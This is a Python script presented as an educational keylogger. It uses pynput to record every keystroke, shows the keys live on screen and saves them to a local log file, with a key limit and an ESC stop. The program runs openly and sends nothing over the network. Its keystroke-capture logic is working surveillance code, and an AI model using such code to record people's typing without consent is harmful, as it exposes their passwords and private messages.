"""
keylogger.py

Educational Keylogger
Author: Abdulhakeem Umar Toyin
GitHub: github.com/feliue

What this does:
- Records every key you press on the keyboard
- Saves the keys to a log file
- Shows a live view of what is being typed
- This is for LEARNING ONLY

How to install the required library:
    pip install pynput

How to run:
    python keylogger.py

WARNING:
    Only run this on your OWN computer.
    Using a keylogger on someone else's
    computer without permission is ILLEGAL.
"""

from pynput import keyboard
from datetime import datetime
import os


# ── Settings ──────────────────────────────────────────────────────────────────

LOG_FILE     = "keylog.txt"   # The file where keys will be saved
MAX_KEYS     = 200            # Stop after this many keys (0 = no limit)

# ── Globals ───────────────────────────────────────────────────────────────────

key_count    = 0
current_line = ""


# ── Helper: get the current time ──────────────────────────────────────────────

def get_time():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


# ── Helper: write to the log file ─────────────────────────────────────────────

def write_to_file(text):
    with open(LOG_FILE, "a") as f:
        f.write(text)


# ── What happens when a key is PRESSED ────────────────────────────────────────

def on_key_press(key):
    global key_count, current_line

    key_count += 1

    try:
        # Normal letter or number key
        char = key.char
        current_line += char
        print(f"  Key pressed: {char}")
        write_to_file(char)

    except AttributeError:
        # Special key like Space, Enter, Backspace etc.

        if key == keyboard.Key.space:
            current_line += " "
            print(f"  Key pressed: [SPACE]")
            write_to_file(" ")

        elif key == keyboard.Key.enter:
            print(f"  Key pressed: [ENTER]")
            print(f"  Line typed : {current_line}")
            write_to_file(f"\n[ENTER] — Line: {current_line}\n")
            current_line = ""

        elif key == keyboard.Key.backspace:
            print(f"  Key pressed: [BACKSPACE]")
            write_to_file("[BACKSPACE]")
            if current_line:
                current_line = current_line[:-1]

        elif key == keyboard.Key.tab:
            print(f"  Key pressed: [TAB]")
            write_to_file("[TAB]")

        elif key == keyboard.Key.caps_lock:
            print(f"  Key pressed: [CAPS LOCK]")
            write_to_file("[CAPS]")

        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            print(f"  Key pressed: [SHIFT]")

        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
            print(f"  Key pressed: [CTRL]")

        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
            print(f"  Key pressed: [ALT]")

        else:
            # Any other special key
            special = str(key).replace("Key.", "").upper()
            print(f"  Key pressed: [{special}]")
            write_to_file(f"[{special}]")

    # Stop after MAX_KEYS (if limit is set)
    if MAX_KEYS > 0 and key_count >= MAX_KEYS:
        print(f"\n  Reached {MAX_KEYS} keys. Stopping...")
        return False  # This stops the listener


# ── What happens when a key is RELEASED ───────────────────────────────────────

def on_key_release(key):
    # Stop if user presses ESC key
    if key == keyboard.Key.esc:
        print("\n  ESC pressed — stopping keylogger...")
        return False  # This stops the listener


# ── Setup the log file ────────────────────────────────────────────────────────

def setup_log_file():
    # Write a header at the top of the log file
    header = f"""
=====================================
  EDUCATIONAL KEYLOGGER LOG
  Author: Abdulhakeem Umar Toyin
  GitHub: github.com/feliue
  Started: {get_time()}
=====================================

"""
    write_to_file(header)


# ── Print the startup screen ──────────────────────────────────────────────────

def print_startup():
    print("""
=====================================
   EDUCATIONAL KEYLOGGER
   Author: Abdulhakeem Umar Toyin
   GitHub: github.com/feliue
=====================================

  What this does:
  - Records every key you press
  - Saves keys to keylog.txt
  - Shows keys live on screen

  Controls:
  - Press ESC to stop
  - Or close the terminal

  WARNING: For educational use only!
  Only use on your own computer.

=====================================
""")
    print(f"  Log file   : {LOG_FILE}")
    print(f"  Key limit  : {MAX_KEYS if MAX_KEYS > 0 else 'No limit'}")
    print(f"  Started at : {get_time()}")
    print("\n  Listening for keys... (Press ESC to stop)\n")
    print("  " + "─" * 40)


# ── Show summary when done ────────────────────────────────────────────────────

def print_summary():
    print("\n  " + "─" * 40)
    print(f"\n  SUMMARY")
    print(f"  Total keys captured : {key_count}")
    print(f"  Log saved to        : {LOG_FILE}")
    print(f"  Stopped at          : {get_time()}")

    # Show the log file contents
    print(f"\n  Contents of {LOG_FILE}:")
    print("  " + "─" * 40)
    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()
            print(content)
    except FileNotFoundError:
        print("  No log file found.")

    print("  " + "─" * 40)
    print("\n  Done! Stay ethical. 🛡\n")


# ── Main function ─────────────────────────────────────────────────────────────

def main():
    # Setup
    setup_log_file()
    print_startup()

    # Start listening to keyboard
    # on_press  = runs when key is pressed
    # on_release = runs when key is released
    with keyboard.Listener(
        on_press   = on_key_press,
        on_release = on_key_release
    ) as listener:
        listener.join()  # Wait until listener stops

    # Show summary after stopping
    print_summary()


# ── Run the program ───────────────────────────────────────────────────────────

if __name__ == "__main__":
    main()
